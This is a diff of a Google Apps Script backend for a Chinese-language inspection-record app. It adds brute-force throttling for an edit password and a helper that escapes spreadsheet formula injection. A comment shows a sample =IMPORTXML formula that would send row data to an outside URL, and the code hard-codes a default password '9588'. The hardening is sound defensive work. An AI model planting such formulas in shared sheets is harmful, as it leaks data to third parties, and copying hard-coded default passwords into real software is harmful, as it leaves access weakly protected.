@@ -10,7 +10,7 @@
 // 後端版本：每次修改本檔就更新，並於前端「資料更新時間」旁顯示。
 // 用途：貼上程式碼後若忘記「部署 → 管理部署作業 → 新版本」，畫面上的後端版本就不會變，
 //       可立即分辨是「沒貼上」「貼了但沒部署」還是「已生效」。
-var GAS_VERSION = '20260824-1700';
+var GAS_VERSION = '20260825-1000';
 
 var SPREADSHEET_ID = '1GRZZsZRgakMGENspOxmlx96NfckC8UYOe0ipuNNEoh0';
 var DRIVE_ROOT_ID  = '122nQjldImn5Zh5AUguxZF0YzobThgdc9';
@@ -49,9 +49,9 @@ function doPost(e) {
       submitRecord: function () { return submitRecord(p.record); },
       attachPhotoLinks: function () { return attachPhotoLinks(p.month, p.recordId, p.links); },
       queryRecords: function () { return { records: queryRecords(p.month, p.filter) }; },
-      updateRecord: function () { return updateRecord(p.month, p.id, p.record, p.pass); },
-      deleteRecord: function () { return deleteRecord(p.month, p.id, p.pass); },
-      checkEditPass: function () { return checkEditPass(p.pass); },
+      updateRecord: function () { return updateRecord(p.month, p.id, p.record, p.pass, sess && (sess.ad || sess.name)); },
+      deleteRecord: function () { return deleteRecord(p.month, p.id, p.pass, sess && (sess.ad || sess.name)); },
+      checkEditPass: function () { return checkEditPass(p.pass, sess && (sess.ad || sess.name)); },
       getSummary: function () { return getSummary(p.month, p.filter); },
       buildMonthlyReport: function () { return buildMonthlyReport(p.month, p.filter, sess && sess.role === '管理者'); },
       importMaster: function () { return importMaster(p.kind, p.month, p.rows, p.fileName, p.batches); },
@@ -541,7 +541,7 @@ function queryRecords(month, filter) {
   }).map(rowToRecord);
 }
 
-function updateRecord(month, id, rec, pass) {
+function updateRecord(month, id, rec, pass, who) {
   var lock = LockService.getScriptLock();
   lock.waitLock(20000);
   try {
@@ -554,7 +554,7 @@ function updateRecord(month, id, rec, pass) {
         var orig = rowObj(head, data[i]);
         // 非當週的紀錄要密碼才能改。用「原紀錄」的點檢時間判斷，不能用前端送來的 rec.time
         // —— 否則只要把時間改成本週就能繞過。
-        var blocked = guardCrossWeek(toYmd(orig['點檢時間']), pass);
+        var blocked = guardCrossWeek(toYmd(orig['點檢時間']), pass, who);
         if (blocked) return blocked;
         rec.id = id; rec.createdAt = orig['建立時間'] || nowStr(); rec.updatedAt = nowStr();
         var newRow = recordToRow(sh, rec); // rec 為前端英文鍵完整紀錄，直接覆寫
@@ -569,7 +569,7 @@ function updateRecord(month, id, rec, pass) {
   }
 }
 
-function deleteRecord(month, id, pass) {
+function deleteRecord(month, id, pass, who) {
   var lock = LockService.getScriptLock();
   lock.waitLock(20000);
   try {
@@ -579,7 +579,7 @@ function deleteRecord(month, id, pass) {
     for (var i = 1; i < data.length; i++) {
       if (String(data[i][idCol]) === String(id)) {
         var timeCol = data[0].indexOf('點檢時間');
-        var blocked = guardCrossWeek(timeCol >= 0 ? toYmd(data[i][timeCol]) : '', pass);
+        var blocked = guardCrossWeek(timeCol >= 0 ? toYmd(data[i][timeCol]) : '', pass, who);
         if (blocked) return blocked;
         sh.deleteRow(i + 1);
         return { ok: true };
@@ -798,7 +798,7 @@ function upsertItem(month, item) {
     var sh = ssBook().getSheetByName('題庫_' + month);
     if (!sh) throw new Error('找不到活頁：題庫_' + month);
     var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
-    var row = head.map(function (h) { return item[h] != null ? item[h] : ''; });
+    var row = head.map(function (h) { return safeCell_(item[h] != null ? item[h] : ''); });
     var data = sh.getDataRange().getValues();
     var idCol = head.indexOf('編號');
     for (var i = 1; i < data.length; i++) {
@@ -851,7 +851,7 @@ var HEADERS_MAP = {
 function logChange(user, action, target, detail) {
   try {
     var sh = ensureSheetNamed('異動紀錄', HEADERS_MAP.log);
-    sh.appendRow([nowStr(), user || '', action || '', target || '', detail || '']);
+    sh.appendRow(safeRow_([nowStr(), user || '', action || '', target || '', detail || '']));
   } catch (e) { /* 記錄失敗不影響主流程 */ }
 }
 function getChangeLog(limit) {
@@ -1014,7 +1014,30 @@ function batchOfDate(periods, ymd) {
 //   前端也會先問一次密碼(體驗)，但真正的把關在這裡 —— 否則用開發者工具就能繞過。
 // ============================================================
 function editPassword() { return String(getSetting('跨週修改密碼') || '9588'); }
-function checkEditPass(pass) { return { ok: String(pass || '') === editPassword() }; }
+
+// 密碼只有四位數，若可以無限次嘗試，等於沒有把關（checkEditPass 與 updateRecord/deleteRecord
+// 都收密碼，任一支都能被拿來窮舉）。以登入者為單位限制連續錯誤次數。
+var EDITPASS_MAX_FAILS = 8;
+var EDITPASS_BLOCK_SEC = 600;   // 連錯達上限後鎖 10 分鐘
+
+function editPassKey(who) { return 'editpass_' + String(who || 'anon').toLowerCase(); }
+function editPassBlocked(who) {
+  var v = CacheService.getScriptCache().get(editPassKey(who));
+  return (v ? Number(v) || 0 : 0) >= EDITPASS_MAX_FAILS;
+}
+function editPassFail(who) {
+  var n = (Number(CacheService.getScriptCache().get(editPassKey(who))) || 0) + 1;
+  CacheService.getScriptCache().put(editPassKey(who), String(n), EDITPASS_BLOCK_SEC);
+}
+function editPassOk(who) { CacheService.getScriptCache().remove(editPassKey(who)); }
+
+/** 驗證跨週密碼；who 為登入者（用來計次）。回 {ok} 或 {ok:false, code:THROTTLED} */
+function checkEditPass(pass, who) {
+  if (editPassBlocked(who)) return { ok: false, code: 'THROTTLED', message: '密碼錯誤次數過多，請 10 分鐘後再試' };
+  var ok = String(pass || "") === editPassword();
+  if (ok) editPassOk(who); else editPassFail(who);
+  return { ok: ok };
+}
 
 /** 該日期字串所屬那一週的週一(yyyy-MM-dd)；週一為一週之始 */
 function weekMondayOf(ymd) {
@@ -1035,10 +1058,12 @@ function isCrossWeek(recTime) {
   return recWeek !== weekMondayOf(today);
 }
 
-/** 編輯/刪除前的把關：非當週且密碼不對就擋下 */
-function guardCrossWeek(recTime, pass) {
+/** 編輯/刪除前的把關：非當週且密碼不對就擋下（密碼錯誤會計次，避免被窮舉） */
+function guardCrossWeek(recTime, pass, who) {
   if (!isCrossWeek(recTime)) return null;
-  if (String(pass || '') === editPassword()) return null;
+  var r = checkEditPass(pass, who);
+  if (r.ok) return null;
+  if (r.code === 'THROTTLED') return { ok: false, code: 'THROTTLED', message: r.message };
   return { ok: false, code: 'CROSS_WEEK',
     message: '這筆是 ' + String(recTime).slice(0, 10) + ' 的紀錄，不在本週(週一~週日)範圍內，需輸入正確密碼才能修改或刪除' };
 }
@@ -1077,6 +1102,18 @@ function photoUrlOf(entry) {
 }
 function photoUrlsOf(arr) { return (arr || []).map(photoUrlOf).filter(Boolean); }
 
+/**
+ * 寫進 Sheet 前處理公式注入：appendRow／setValues 會把 = + - @ 開頭的字串當成公式執行，
+ * 例如備註填 =IMPORTXML("https://…?d="&A2,"//x") 就會把同列資料送到外部網址。
+ * 前置一個單引號即強制為文字；Sheet 讀回時不含這個單引號，所以資料本身不變。
+ * （用 setNumberFormat('@') 的寫入點已經是文字格式，不需要再過這裡。）
+ */
+function safeCell_(v) {
+  if (typeof v !== 'string' || !v) return v;
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
+}
+function safeRow_(row) { return row.map(safeCell_); }
+
 /** 將前端紀錄物件轉成該活頁欄位順序的列陣列 */
 function recordToRow(sh, rec) {
   var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
@@ -1090,7 +1127,7 @@ function recordToRow(sh, rec) {
     '照片資料夾': rec.folderUrl || '', '同步狀態': '已同步',
     '建立時間': rec.createdAt, '更新時間': rec.updatedAt,
   };
-  return head.map(function (h) { return map[h] != null ? map[h] : ''; });
+  return head.map(function (h) { return safeCell_(map[h] != null ? map[h] : ''); });
 }
 
 function rowToRecord(r) {
